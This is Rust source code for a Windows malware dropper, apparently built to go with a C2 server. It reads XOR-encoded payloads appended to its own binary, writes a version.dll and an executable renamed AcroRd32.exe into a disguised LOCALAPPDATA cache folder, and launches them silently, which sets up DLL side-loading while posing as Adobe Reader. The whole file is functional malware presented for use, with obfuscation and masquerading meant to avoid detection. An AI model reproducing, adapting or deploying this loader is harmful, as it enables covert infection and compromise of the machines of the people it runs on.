#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

// Format appended after this binary by the C2 server:
//   MAGIC[8] | dll_enc_len[4 LE] | xor_enc(version.dll) | exe_enc_len[4 LE] | xor_enc(Setup.exe)
// XOR key = first 4 bytes of each encrypted blob.
const MAGIC: &[u8; 8] = b"DMSDRPX!";

fn xor_unpack(data: &[u8]) -> Vec<u8> {
    if data.len() < 5 {
        return Vec::new();
    }
    let key = [data[0], data[1], data[2], data[3]];
    data[4..].iter().enumerate().map(|(i, &b)| b ^ key[i % 4]).collect()
}

fn read_u32_le(b: &[u8]) -> Option<u32> {
    b.get(..4).map(|s| u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

fn main() {
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    let bytes = match std::fs::read(&exe_path) {
        Ok(b) => b,
        Err(_) => return,
    };

    // Find last occurrence of magic (after all PE sections)
    let magic_pos = match bytes.windows(8).rposition(|w| w == MAGIC) {
        Some(p) => p,
        None => return,
    };

    let payload = &bytes[magic_pos + 8..];

    let dll_len = match read_u32_le(payload) {
        Some(n) => n as usize,
        None => return,
    };
    if payload.len() < 4 + dll_len + 4 {
        return;
    }
    let dll = xor_unpack(&payload[4..4 + dll_len]);

    let exe_off = 4 + dll_len;
    let exe_len = match read_u32_le(&payload[exe_off..]) {
        Some(n) => n as usize,
        None => return,
    };
    if payload.len() < exe_off + 4 + exe_len {
        return;
    }
    let exe = xor_unpack(&payload[exe_off + 4..exe_off + 4 + exe_len]);

    if dll.is_empty() || exe.is_empty() {
        return;
    }

    let suffix = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0xdeadbeef);
    let base = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Users\\Public".into());
    let tmp = std::path::Path::new(&base)
        .join("Microsoft")
        .join("Windows")
        .join("Caches")
        .join(format!("{:08x}", suffix));
    let _ = std::fs::create_dir_all(&tmp);
    let _ = std::fs::write(tmp.join("version.dll"), &dll);
    let host = tmp.join("AcroRd32.exe");
    let _ = std::fs::write(&host, &exe);
    let _ = std::process::Command::new(&host).current_dir(&tmp).spawn();
}
